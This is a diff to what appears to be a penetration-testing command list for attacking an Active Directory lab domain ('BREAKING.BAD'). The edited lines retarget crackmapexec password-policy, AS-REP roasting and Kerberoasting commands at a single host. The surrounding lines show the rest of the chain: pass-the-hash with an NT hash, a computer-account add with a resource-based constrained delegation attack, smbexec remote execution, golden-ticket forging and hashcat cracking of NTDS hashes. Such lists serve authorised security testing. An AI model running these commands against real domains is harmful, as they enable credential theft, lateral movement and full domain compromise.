@@ -130,6 +130,8 @@ GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes :
 GetUserSPNs.py -outputfile Kerberoastables.txt BREAKING.BAD/anonymous:anonymous
 GetUserSPNs.py -outputfile Kerberoastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator
 polenum -u anonymous -p anonymous -d BREAKING.BAD
+cme smb 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --pass-pol
+crackmapexec smb 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --pass-pol
 addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass '123soleil!' -dc-host DC01 -domain-netbios BREAKING.BAD 'BREAKING.BAD\anonymous:anonymous'
 rbcd-attack -f SHUTDOWN -t SV01 -dc-ip DC01.BREAKING.BAD 'BREAKING.BAD\anonymous:anonymous'
 smbexec.py -share 'ADMIN$' -k SV01.BREAKING.BAD
@@ -141,8 +143,9 @@ lookupsid.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 'BREAKING.BAD/Administrat
 ticketer.py -nthash 123456789krbtgtnthash123456789 -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain BREAKING.BAD randomuser
 export KRB5CCNAME=randomuser.ccache
 hashcat -m 1000 --potfile-path ntds.cracked ntds.tocrack --show --username --outfile-format 3
-cme ldap 192.168.56.0/24 -d BREAKING.BAD -u anonymous -p anonymous --asreproast ASREProastables.txt
-cme ldap 192.168.56.0/24 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasting kerberoastables.txt
-crackmapexec ldap 192.168.56.0/24 -d BREAKING.BAD -u anonymous -p anonymous --asreproast ASREProastables.txt
-crackmapexec ldap 192.168.56.0/24 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasting kerberoastables.txt
+cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --asreproast ASREProastables.txt
+cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --asreproast ASREProastables.txt --kdcHost 192.168.56.101
+cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasting kerberoastables.txt
+crackmapexec ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --asreproast ASREProastables.txt --kdcHost 192.168.56.101
+crackmapexec ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasting kerberoastables.txt
 ldapsearch -x -h 192.168.56.101 -D '' -w '' -b "dc=BREAKING,dc=BAD"
